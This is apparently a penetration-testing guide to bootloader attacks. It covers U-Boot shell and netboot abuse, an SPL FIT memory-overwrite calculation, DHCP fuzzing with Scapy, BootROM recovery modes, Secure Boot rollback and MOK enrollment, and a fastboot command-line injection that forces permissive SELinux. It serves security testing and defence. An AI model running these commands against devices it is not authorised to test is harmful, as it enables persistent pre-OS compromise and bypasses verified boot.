title: Bootloader testing
html:
Bootloader Testing

The following steps are recommended for modifying device startup configurations and testing bootloaders such as U-Boot and UEFI-class loaders. Focus on getting early code execution, assessing signature/rollback protections, and abusing recovery or network-boot paths.

Related: MediaTek secure-boot bypass via bl2_ext patching:

android-mediatek-secure-boot-bl2_ext-bypass-el3.md

U-Boot quick wins and environment abuse

  1. Access the interpreter shell

  2. During boot, hit a known break key (often any key, 0, space, or a board-specific "magic" sequence) before bootcmd executes to drop to the U-Boot prompt.[1]

  3. Inspect boot state and variables

  4. Useful commands:

    • printenv (dump environment)
    • bdinfo (board info, memory addresses)
    • help bootm; help booti; help bootz (supported kernel boot methods)
    • help ext4load; help fatload; help tftpboot (available loaders)

  5. Modify boot arguments to get a root shell

  6. Append init=/bin/sh so the kernel drops to a shell instead of normal init: 

    # printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd

  7. Netboot from your TFTP server

  8. Configure network and fetch a kernel/fit image from LAN: 

    # setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}

  9. Persist changes via environment

  10. If env storage isn’t write-protected, you can persist control: 
    # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv

  11. Check for variables like bootcount, bootlimit, altbootcmd, boot_targets that influence fallback paths. Misconfigured values can grant repeated breaks into the shell.

  12. Check debug/unsafe features

  13. Look for: bootdelay > 0, autoboot disabled, unrestricted usb start; fatload usb 0:1 ..., ability to loady/loads via serial, env import from untrusted media, and kernels/ramdisks loaded without signature checks.

  14. U-Boot image/verification testing

  15. If the platform claims secure/verified boot with FIT images, try both unsigned and tampered images: 
    # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
  16. Absence of CONFIG_FIT_SIGNATURE/CONFIG_(SPL_)FIT_SIGNATURE or legacy verify=n behavior often allows booting arbitrary payloads.
  17. Don’t stop at a simple allow/deny result: recent FIT research showed that the verification path itself can be a pre-auth attack surface. Negative-test externally stored FIT data (data-offset, data-position, data-size), signed configuration selection, loadables, and overlay / extra-conf handling.

  18. If you have a matching source tree, test/vboot/vboot_test.sh is a fast way to reproduce FIT verification behaviour in U-Boot sandbox before touching real hardware.[10]

  19. Standard Boot (bootstd), extlinux, and script bootflows

  20. On modern U-Boot builds, bootcmd is often just a wrapper around Standard Boot. That means writable media, PXE, or SPI flash can become the real trust boundary even when the visible environment looks harmless.
  21. extlinux bootmeth searches extlinux/extlinux.conf under / and /boot; the script bootmeth searches boot.scr.uimg first and then boot.scr. On network boot, the script filename can come from boot_script_dhcp.
  22. Useful triage commands: 
    # bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
  23. Abuse cases to test: attacker-controlled USB/SD media earlier in boot_targets, writable /boot/extlinux/extlinux.conf, rogue TFTP supplying boot.scr, or SPI-backed script execution via script_offset_f.
  24. If the platform relies on FIT verification, make sure configurations are signed at the configuration level and not only per-image; required-mode=all is stronger than accepting any single required key.

SPL external FIT data copied before verification

For SPL FIT loading, an intact configuration signature does not make external payload metadata safe. U-Boot excludes data-position, data-offset, and data-size from signed configuration properties. In affected load_simple_fit() paths, SPL derives a source offset and copy length from those fields, then calls info->read() before checking the image hash. A crafted FIT on writable boot media can therefore overwrite RAM without forging a signature. The signed load property normally fixes the destination, so first determine whether an oversized copy can reach the stack or other control data from that address.[15][16]

Trace the board's actual loader and memory map instead of assuming a flash read: the demonstrated RAM loader reached spl_ram_load_read() and memcpy(). At the call site, record fit_offset and any FIT base address added by the reader, the loader's block length (spl_get_bl_len(info)), any fork-specific alignment, the resulting read_offset and transfer size, destination src_ptr, and saved return-address location. Check whether a contiguous mapped source region covers the required copy distance, whether it overlaps the destination, and whether bytes at the source position can supply a pointer into attacker-controlled FIT data. The generic partial return-address overwrite technique applies if a full pointer cannot satisfy the loader's alignment constraints.[16]

In the researchers' 32-bit AST2600 test build, src_ptr was 0x80001000 and memcpy's saved return address was at 0x902ffe24. They used an upstream build modified with OpenBMC's stack placement and alignment helpers: the RAM reader added a 0x10000 FIT base, and those helpers rounded the source offset down to ARCH_DMA_MINALIGN (64 bytes). A useful little-endian pointer at 0x902fffe4 and a copy ending one byte short changed only the low three bytes of the saved return address, preserving its known zero high byte. The upstream RAM loader instead uses a block length of one byte, so this 64-byte alignment and partial-overwrite workaround are not general SPL requirements. Re-derive the addresses, loader block length, and copy extent for each build. In the original calculation below, fit_offset denotes the effective FIT-base addition by the RAM reader, not necessarily the argument passed to load_simple_fit().[16]

distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27

The upstream fix bounds both the raw data-size and the block-aligned transfer size before info->read(). Its overlay path passes the actual buffer capacity, while other callers use CONFIG_SYS_BOOTM_LEN, which is only a loose ceiling rather than proof that the destination has that much free memory. When assessing a vendor fork, verify those checks are present and compare the permitted copy range with the board's real SPL stack and reserved regions.[15][16]

Network-boot surface (DHCP/PXE) and rogue servers

  1. PXE/DHCP parameter fuzzing
  2. U-Boot’s legacy BOOTP/DHCP handling has had memory-safety issues. For example, CVE‑2024‑42040 describes memory disclosure via crafted DHCP responses that can leak bytes from U-Boot memory back on the wire.[4] Exercise the DHCP/PXE code paths with overly long/edge-case values (option 67 bootfile-name, vendor options, file/servername fields) and observe for hangs/leaks.
  3. Minimal Scapy snippet to stress boot parameters during netboot: 
    from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
         IP(src='192.168.2.1', dst='255.255.255.255')/
         UDP(sport=67, dport=68)/
         BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
         DHCP(options=[('message-type','offer'),
                       ('server_id','192.168.2.1'),
                       # Intentionally oversized and strange values
                       ('bootfile_name','A'*300),
                       ('vendor_class_id','B'*240),
                       'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)

  4. Also validate if PXE filename fields are passed to shell/loader logic without sanitization when chained to OS-side provisioning scripts.

  5. Rogue DHCP server command injection testing

  6. Set up a rogue DHCP/PXE service and try injecting characters into filename or options fields to reach command interpreters in later stages of the boot chain. Metasploit’s DHCP auxiliary, dnsmasq, or custom Scapy scripts work well. Ensure you isolate the lab network first.

SoC ROM recovery modes that override normal boot

Many SoCs expose a BootROM "loader" mode that will accept code over USB/UART even when flash images are invalid. If secure-boot fuses aren’t blown, this can provide arbitrary code execution very early in the chain.

  • NXP i.MX (Serial Download Mode)
  • Tools: uuu (mfgtools3) or imx-usb-loader.
  • Example: imx-usb-loader u-boot.imx to push and run a custom U-Boot from RAM.
  • Allwinner (FEL)
  • Tool: sunxi-fel.
  • Example: sunxi-fel -v uboot u-boot-sunxi-with-spl.bin or sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000.
  • Rockchip (MaskROM)
  • Tool: rkdeveloptool.
  • Example: rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin to stage a loader and upload a custom U-Boot.

Assess whether the device has secure-boot eFuses/OTP burned. If not, BootROM download modes frequently bypass any higher-level verification (U-Boot, kernel, rootfs) by executing your first-stage payload directly from SRAM/DRAM.

UEFI/PC-class bootloaders: quick checks

  1. ESP tampering, rollback, and key-enrollment testing
  2. Mount the EFI System Partition (ESP) and check for loader components: EFI/Microsoft/Boot/bootmgfw.efi, EFI/BOOT/BOOTX64.efi, EFI/ubuntu/shimx64.efi, grubx64.efi, vendor logo paths.
  3. Dump Secure Boot state and key databases from the OS when possible: 
    mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
  4. If the platform is in Setup Mode, accepts unauthenticated key enrollment, or ships with a test/default Platform Key (PKfail class), a local admin or physical attacker can enroll their own KEK/db and keep Secure Boot looking “enabled” while booting arbitrary EFI binaries.[3]
  5. Try booting with downgraded or known-vulnerable signed boot components if Secure Boot revocations (dbx) aren’t current. If the platform still trusts old shims/bootmanagers, you can often load your own kernel or grub.cfg from the ESP to gain persistence.
  6. On Windows, patched hosts can still accept vulnerable signed boot managers if the Microsoft Windows Production PCA 2011 signer remains absent from firmware dbx, as observed with BlackX.[13][14] A Baton Drop-style bypass can enroll an attacker MOK; a legitimate shim can then load an EFI payload signed by that key on later boots.[12][13] Revoking the old Windows signer later does not remove the enrolled MOK, so the shim-based path can persist if that shim remains trusted.[12]

  7. Before testing this rollback path on an authorized UEFI machine, check the effective firmware revocation state, not just the Windows update history.[13][14] Microsoft gives this read-only elevated PowerShell check for the 2011 signer in dbx:[14] 

    [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
    False is only a lead: confirm the specific signed boot component and other revocations in a recoverable lab.[12][14] A pending registry update or an expired signing certificate is not equivalent to a completed dbx revocation.[13][14]

  8. Stale shim / SBAT / dbx revocation testing

  9. Old Microsoft-signed shims and vendor forks can still act as a BYOVD-style bootkit path if revocations are stale. In an isolated lab, place a historically vulnerable shim on the ESP and attempt to chainload your own grubx64.efi or kernel.[11]
  10. Quick triage: 
    sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v

  11. If the shim still runs despite being on the revocation list, the firmware/OS has stale dbx updates or trusts a forked loader that never inherited upstream SBAT protections.

  12. Boot logo parsing bugs (LogoFAIL class)

  13. Several OEM/IBV firmwares were vulnerable to image-parsing flaws in DXE that process boot logos. If an attacker can place a crafted image on the ESP under a vendor-specific path (e.g., \EFI\<vendor>\logo\*.bmp) and reboot, code execution during early boot may be possible even with Secure Boot enabled. Test whether the platform accepts user-supplied logos and whether those paths are writable from the OS.[2]

Android/Qualcomm ABL + GBL (Android 16) trust gaps

On Android 16 devices that use Qualcomm's ABL to load the Generic Bootloader Library (GBL), validate whether ABL authenticates the UEFI app it loads from the efisp partition. If ABL only checks for a UEFI app presence and does not verify signatures, a write primitive to efisp becomes pre-OS unsigned code execution at boot.[6][7]

Practical checks and abuse paths:

  • efisp write primitive: You need a way to write a custom UEFI app into efisp (root/privileged service, OEM app bug, recovery/fastboot path). Without this, the GBL loading gap is not directly reachable.[6]
  • fastboot OEM argument injection (ABL bug): Some builds accept extra tokens in fastboot oem set-gpu-preemption and append them to the kernel cmdline. This can be used to force permissive SELinux, enabling protected partition writes: 
    fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
    If the device is patched, the command should reject extra arguments.[5][6]
  • Bootloader unlock via persistent flags: A boot-stage payload can flip persistent unlock flags (e.g., is_unlocked=1, is_unlocked_critical=1) to emulate fastboot oem unlock without OEM server/approval gates. This is a durable posture change after the next reboot.[6]

Defensive/triage notes:

  • Confirm whether ABL performs signature verification on the GBL/UEFI payload from efisp. If not, treat efisp as a high‑risk persistence surface.
  • Track whether ABL fastboot OEM handlers are patched to validate argument counts and reject additional tokens.[8][9]

Hardware caution

Be cautious when interacting with SPI/NAND flash during early boot (e.g., grounding pins to bypass reads) and always consult the flash datasheet. Mistimed shorts can corrupt the device or the programmer.

Notes and additional tips

  • Try env export -t ${loadaddr} and env import -t ${loadaddr} to move environment blobs between RAM and storage; some platforms allow importing env from removable media without authentication.
  • For persistence on Linux-based systems that boot via extlinux.conf, modifying the APPEND line (to inject init=/bin/sh or rd.break) on the boot partition is often enough when no signature checks are enforced.
  • If the target uses dual-slot / A/B updates, review the anti-rollback and slot-desync techniques in the firmware analysis overview so you don’t miss updater-only trust gaps outside the bootloader itself.
  • If userland provides fw_printenv/fw_setenv, validate that /etc/fw_env.config matches the real env storage. Misconfigured offsets let you read/write the wrong MTD region.
